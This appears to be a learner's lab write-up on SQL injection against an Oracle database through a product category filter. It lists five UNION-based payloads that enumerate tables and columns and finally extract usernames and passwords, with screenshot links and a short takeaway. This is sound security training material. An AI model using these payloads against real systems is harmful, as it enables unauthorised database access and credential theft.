---
topic: SQL injection
level: Practitioner
time_spent: 15 mins
date: 23rd Nov, 2026
Database type: Oracle
---

**Vulnerability:** 
SQL injection vulnerability in the product category filter.

**Payload:**
```
category='+UNION+SELECT+NULL,NULL+FROM+dual--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123.png)

```
category='+UNION+SELECT+'abs','asc'+FROM+dual--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-1.png)

```
category='+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-2.png)

```
category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_CUVMVY'--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-3.png)

```
category='+UNION+SELECT+USERNAME_KCETUV,PASSWORD_OJIDQI+FROM+USERS_CUVMVY--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-4.png)

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-5.png)

**What I learned:**
We can retrieve the information from the Oracle as well by changing the few things according the oracle. 